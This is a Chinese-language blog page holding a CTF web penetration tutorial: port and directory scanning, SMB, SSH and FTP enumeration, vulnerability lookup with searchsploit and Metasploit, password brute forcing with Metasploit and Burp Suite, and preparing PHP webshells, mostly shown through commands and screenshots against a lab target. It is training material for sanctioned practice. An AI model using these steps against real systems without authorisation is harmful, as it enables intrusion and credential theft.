<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"cgw-f.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="北极星上的稻草人">
<meta property="og:url" content="https://cgw-f.github.io/page/6/index.html">
<meta property="og:site_name" content="北极星上的稻草人">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="北极星上的稻草人">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://cgw-f.github.io/page/6/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>北极星上的稻草人</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">北极星上的稻草人</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">稻草人笔记</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">13</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">11</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">86</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">CTF-WEB渗透思路与技巧</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-11-26 11:04:23" itemprop="dateCreated datePublished" datetime="2021-11-26T11:04:23+08:00">2021-11-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-02-28 10:28:19" itemprop="dateModified" datetime="2023-02-28T10:28:19+08:00">2023-02-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="CTF-WEB渗透入门思路与技巧"><a href="#CTF-WEB渗透入门思路与技巧" class="headerlink" title="CTF-WEB渗透入门思路与技巧"></a>CTF-WEB渗透入门思路与技巧</h1><p>说明：图片只是一个展示效果，可能前后不对应</p>
<h2 id="步骤一：信息探测"><a href="#步骤一：信息探测" class="headerlink" title="步骤一：信息探测"></a>步骤一：信息探测</h2><h4 id="1、扫描主机服务信息以及服务版本"><a href="#1、扫描主机服务信息以及服务版本" class="headerlink" title="1、扫描主机服务信息以及服务版本"></a>1、扫描主机服务信息以及服务版本</h4><p><strong>a.**扫描主机</strong>开放的端口号<strong>：</strong>nmap -p -T4 靶场ip地址**</p>
<p>参数说明：-p指端口，-T4指线程数为4</p>
<p><strong>b.快速扫描主机全部信息</strong>：<strong>nmap -T4 -A -v 靶场ip地址</strong> </p>
<p>参数说明：-A指all（全部），-v指快速</p>
<p>说明：有时候b扫描方式的结果会漏（在端口开放扫描部分）</p>
<p><strong>c.探测开放服务信息</strong>：<strong>nmap -sV 靶场ip地址</strong></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102200402655.png" alt="image-20211102200402655"></p>
<p>tip0：一般用b、c操作就足够了。</p>
<p>tip1：注意开放的服务与其可能存在的漏洞/攻击方法：ssh服务：远程登录；ftp服务：文件上传</p>
<p>tip3：后面所有操作都要考虑端口占用情况，可以用netstat -pantu来查看占用端口</p>
<h4 id="2、探测目录信息"><a href="#2、探测目录信息" class="headerlink" title="2、探测目录信息"></a>2、探测目录信息</h4><p>！！这里要求靶场开启了http服务！！</p>
<p>**a.**nikto -host http://靶场IP地址：端口 </p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104160032606.png" alt="image-20211104160032606"></p>
<p>**b.**dirb http://靶场IP地址：端口</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104155903347.png" alt="image-20211104155903347"></p>
<p>说明：</p>
<p>（1）端口不填，默认是80端口；</p>
<p>（2）虽然都是探测目录信息，但探测到的信息往往是互补的，a操作侧重于敏感信息，b操作侧重于敏感目录。</p>
<h4 id="3、用sparta探测（图形化界面工具）"><a href="#3、用sparta探测（图形化界面工具）" class="headerlink" title="3、用sparta探测（图形化界面工具）"></a>3、用sparta探测（图形化界面工具）</h4><p>启动软件（kali自带）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104152216258.png" alt="image-20211104152216258"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104152211299.png" alt="image-20211104152211299"></p>
<p>软件会进行nmap、nikto、screenshot扫描</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104152242903.png" alt="image-20211104152242903"></p>
<p>点击下面的扫描模块就可以查看详情，也可以单独对某个端口进行扫描</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104152303730.png" alt="image-20211104152303730"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104152331126.png" alt="image-20211104152331126"></p>
<p>还可以用dirt进行暴力探测</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104152341971.png" alt="image-20211104152341971"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104152348212.png" alt="image-20211104152348212"></p>
<h2 id="步骤2：深入挖掘信息-分析探测结果"><a href="#步骤2：深入挖掘信息-分析探测结果" class="headerlink" title="步骤2：深入挖掘信息/分析探测结果"></a>步骤2：深入挖掘信息/分析探测结果</h2><h3 id="端口-服务利用"><a href="#端口-服务利用" class="headerlink" title="端口/服务利用"></a>端口/服务利用</h3><h4 id="1、大端口利用"><a href="#1、大端口利用" class="headerlink" title="1、大端口利用"></a>1、大端口利用</h4><p>​    常用端口为0~1023，要注意大于1024的端口和一些不知名或乱起名的服务</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102202748686.png" alt="image-20211102202748686"></p>
<p>技巧1：利用nc扫描大端口（非http服务）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102203709341.png" alt="image-20211102203709341"></p>
<p>技巧2：直接访问大端口http服务</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102204232751.png" alt="image-20211102204232751"></p>
<h4 id="2、SMB服务利用"><a href="#2、SMB服务利用" class="headerlink" title="2、SMB服务利用"></a>2、SMB服务利用</h4><p>​    SMB协议又叫samba，是一种通讯协议，它基于TCP协议，一般使用139、445端口。SMB允许计算机访问网络资源，下载对应的源文件。</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102214659335.png" alt="image-20211102214659335"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102214559780.png" alt="image-20211102214559780"></p>
<p><strong>a、smbclient -L IP：</strong>扫描出对应IP地址的主机共享的文件夹</p>
<p>（若空密码不行，可能需要另外方法寻找方法）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102215008230.png" alt="image-20211102215008230"></p>
<p><strong>b、smbclient  ‘\\IP\$share’：</strong>查看对应IP主机上的共享文件（share指文件名）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102215117240.png" alt="image-20211102215117240"></p>
<p><strong>c、get （敏感信息）文件名：</strong>下载文件</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102215227610.png" alt="image-20211102215227610"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102215245319.png" alt="image-20211102215245319"></p>
<p><strong>d、searchsploit samba 版本号：</strong>查看某个版本号的SMB协议是否有（溢出）漏洞：这里没有</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211030105045103.png" alt="image-20211030105045103"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102220133905.png" alt="image-20211102220133905"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102220153317.png" alt="image-20211102220153317"></p>
<h4 id="3、ssh服务利用"><a href="#3、ssh服务利用" class="headerlink" title="3、ssh服务利用"></a>3、ssh服务利用</h4><p>​    SSH（secure shell）是基于TCP 22号端口的服务，是建立在应用层基础上的安全协议，它专为远程登录会话和其他网络服务提供安全性的协议，利用SSH协议可以有效防止远程管理过程中的信息泄露问题。</p>
<p><strong>ssh远程登录：</strong>ssh -p 用户名@ip地址</p>
<h5 id="ssh协议认证机制及其漏洞利用"><a href="#ssh协议认证机制及其漏洞利用" class="headerlink" title="ssh协议认证机制及其漏洞利用"></a>ssh协议认证机制及其漏洞利用</h5><p><strong>a.基于口令的安全验证：</strong>利用账号和口令就可以登录远程主机；传输的数据会被加密，但不能保证正在连接的服务器就是你想连接的服务器，因此会受到“中间人”攻击（有人冒充服务器）。</p>
<p><strong>漏洞利用</strong>：基于字典的暴力破解，破解对应用户名和密码，通过ssh客户端服务连接远程主机的ssh服务，实现对服务器的一定控制。</p>
<p><strong>b.基于密钥的安全验证：</strong>需要依靠密钥，用户必须创建一对密钥（公钥和私钥），把私钥放在服务器上，通过SSH连接服务器时提供正确私钥即可登录。</p>
<p><strong>漏洞利用：</strong>通过对主机信息收集，获取到泄露的用户名和对应的密钥</p>
<h4 id="4、FTP服务利用"><a href="#4、FTP服务利用" class="headerlink" title="4、FTP服务利用"></a>4、FTP服务利用</h4><p>​    FTP服务是一个文件传输协议。</p>
<p>漏洞利用：在浏览器中输入 ftp://靶场IP地址，进行匿名登录ftp根目录，再查看敏感文件（配置文件要查看源代码）。</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104153117467.png" alt="image-20211104153117467"></p>
<h3 id="目录利用"><a href="#目录利用" class="headerlink" title="目录利用"></a>目录利用</h3><p>​    对于用dirt、nikto等工具探测到的目录，要特备关注一些敏感目录/文件；如名字带有：</p>
<p>​        ●admin：管理员界面，一般是服务器后台界面或其登录界面</p>
<p>​        ●passwd：password的缩写，尝包含密码信息</p>
<p>​        ●shadow：常保存用户名，与passwd的密码匹配</p>
<p>​        ●index：主页，往往会留下提示/漏洞，需要审计其源码</p>
<p>​        ●robots：隐藏文件目录，常保存敏感文件</p>
<p>​        ●backup：备份文件，常保存密钥等敏感文件</p>
<p>​        ●config：配置文件，常可以发现漏洞/密钥信息，需要审计源码（要留意注释）</p>
<p>​        ●login：登录界面，先尝试弱密码登录，要么需要寻找用户名和口令/密钥，要么利用注入漏洞，最后才用爆破法</p>
<p>​        ●home：普通用户根目录，有时可以发现用户名等敏感信息</p>
<p>​        ●upload：上传文件，常需要上传webshell获取shell</p>
<p>​        ●download：下载文件，常可以下载敏感文件</p>
<p>​        ●.php/.python等：可代码审计，已达到利用语句或发现漏洞</p>
<p>​        ●mysql/sql/__db：数据库，需要登录其数据库，查找用户名和密码</p>
<p>​        ●ssi：可能存在ssi漏洞的页面</p>
<p>​        ●.txt文件：常存有密钥（可能是加密形式）、口令、用户名等信息</p>
<p>​        ●icon：特别文件</p>
<p>​        ●wordpress（wp缩写）：常保存与密钥或登录的相关信息</p>
<p>​        ●ssh/samba等：对应漏洞的利用</p>
<p>​        ●secure：敏感文件</p>
<p>​        ●nothing：常是假404页面，需要代码审计</p>
<p>​    还有根目录和一些乱七八糟的目录需要注意；有时候文件/目录背后会有提示该文件/目录是敏感的。对于敏感网站还要查看其源码（注意注释、代码审计等），如主页、登录界面等等页面</p>
<p>如：</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104161211476.png" alt="image-20211104161211476"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104160837857.png" alt="image-20211104160837857"></p>
<p>​    目录利用是信息挖掘最重要的一步，往往很多重要的信息（用户名、密钥、敏感漏洞）都是在这一步发现的。</p>
<h2 id="步骤3：弱点-漏洞扫描-信息利用"><a href="#步骤3：弱点-漏洞扫描-信息利用" class="headerlink" title="步骤3：弱点/漏洞扫描/信息利用"></a>步骤3：弱点/漏洞扫描/信息利用</h2><h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><h4 id="1、使用metasploit扫描漏洞"><a href="#1、使用metasploit扫描漏洞" class="headerlink" title="1、使用metasploit扫描漏洞"></a>1、使用metasploit扫描漏洞</h4><p>a、seachsploit 服务的软件版本查找漏洞信息</p>
<p>服务的软件版本号可以用nmap -sV ip地址查询</p>
<p>如：扫描ftp服务的软件</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104153707417.png" alt="image-20211104153707417"></p>
<p>ProFTPD是ftp服务的软件，1.3.3c是版本号</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104153947435.png" alt="image-20211104153947435"></p>
<p>b、使用metasploit的search查找漏洞模块</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104193152596.png" alt="image-20211104193152596"></p>
<h4 id="2、使用owasp-zap扫描漏洞"><a href="#2、使用owasp-zap扫描漏洞" class="headerlink" title="2、使用owasp-zap扫描漏洞"></a>2、使用owasp-zap扫描漏洞</h4><p>​    kali自带owasp-zap</p>
<p>终端启动</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104194037138.png" alt="image-20211104194037138"></p>
<p>图形化界面启动</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104193650252.png" alt="image-20211104193650252"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104193655617.png" alt="image-20211104193655617"></p>
<h4 id="3、使用AVWS（Acunetix）扫描漏洞"><a href="#3、使用AVWS（Acunetix）扫描漏洞" class="headerlink" title="3、使用AVWS（Acunetix）扫描漏洞"></a>3、使用AVWS（Acunetix）扫描漏洞</h4><p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104195647852.png" alt="image-20211104195647852"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104195806884.png" alt="image-20211104195806884"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104195832261.png" alt="image-20211104195832261"></p>
<h4 id="4、探测中间件PUT漏洞"><a href="#4、探测中间件PUT漏洞" class="headerlink" title="4、探测中间件PUT漏洞"></a>4、探测中间件PUT漏洞</h4><p>​    只要HTTP方法开启了PUT功能，PUT可以直接从客户机上传文件到服务器。 探测http开启中间件指令：curl -v -X OPTIONS 目标地址</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104194628075.png" alt="image-20211104194628075"></p>
<h3 id="弱点漏洞"><a href="#弱点漏洞" class="headerlink" title="弱点漏洞"></a>弱点漏洞</h3><p>有输入的地方，就可以存在注入漏洞！；具体操作查看本博客对应的文章</p>
<p>​    a、sql注入：《CTF渗透引入》、《SQL注入》</p>
<p>​    b、SSI注入：《SSI注入》</p>
<p>​    c、命令注入：《命令注入》</p>
<p>​    d、目录遍历：《目录遍历漏洞》</p>
<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><h4 id="1、使用msf暴力破解"><a href="#1、使用msf暴力破解" class="headerlink" title="1、使用msf暴力破解"></a>1、使用msf暴力破解</h4><p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200102859.png" alt="image-20211104200102859"></p>
<p>《web安全暴力破解》</p>
<p>a.利用wpscan获取用户名和密码（如果没有探测到）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211031163357930.png" alt="image-20211031163357930"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200258439.png" alt="image-20211104200258439"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211031163538379.png" alt="image-20211031163538379"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200421430.png" alt="image-20211104200421430"></p>
<p>b.利用msf暴力破解登录密码</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200509299.png" alt="image-20211104200509299"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200514650.png" alt="image-20211104200514650"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200526368.png" alt="image-20211104200526368"></p>
<p>rhost：靶机地址（lhost：攻击地址）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200551621.png" alt="image-20211104200551621"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200556107.png" alt="image-20211104200556107"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200600049.png" alt="image-20211104200600049"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200611821.png" alt="image-20211104200611821"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200617555.png" alt="image-20211104200617555"></p>
<h4 id="2、使用burpsuite爆破"><a href="#2、使用burpsuite爆破" class="headerlink" title="2、使用burpsuite爆破"></a>2、使用burpsuite爆破</h4><p>a、获取爆破用的字典（这里是kali自带的sql注入字典）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102140627873.png" alt="image-20211102140627873"></p>
<p>b、设置中断获取爆破页面数据</p>
<p>设置浏览器代理服务器</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201522077.png" alt="image-20211104201522077"></p>
<p>启动中断</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201537419.png" alt="image-20211104201537419"></p>
<p>截取数据</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201555173.png" alt="image-20211104201555173"></p>
<p>c、爆破</p>
<p>将抓取的页面发到intruder模块进行爆破</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201619332.png" alt="image-20211104201619332"></p>
<p>设置爆破区域</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201630302.png" alt="image-20211104201630302"></p>
<p>设置爆破字典</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201643667.png" alt="image-20211104201643667"></p>
<p>启动</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201653148.png" alt="image-20211104201653148"></p>
<p>查看结果</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201703598.png" alt="image-20211104201703598"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201710210.png" alt="image-20211104201710210"></p>
<p>（最后发现输入返回长度为2900的是正确密码：例子出自《CTF综合测试》）</p>
<h2 id="步骤4：上传webshell"><a href="#步骤4：上传webshell" class="headerlink" title="步骤4：上传webshell"></a>步骤4：上传webshell</h2><p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105103733193.png" alt="image-20211105103733193"></p>
<h3 id="制作webshell"><a href="#制作webshell" class="headerlink" title="制作webshell"></a>制作webshell</h3><h4 id="1、制作php的webshell"><a href="#1、制作php的webshell" class="headerlink" title="1、制作php的webshell"></a>1、制作php的webshell</h4><p>​    a、使用/usr/share/webshell/php下的webshell（kali自带）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104210730250.png" alt="image-20211104210730250"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211031151536728.png" alt="image-20211031151536728"></p>
<p>b、利用kali生成php的webshell</p>
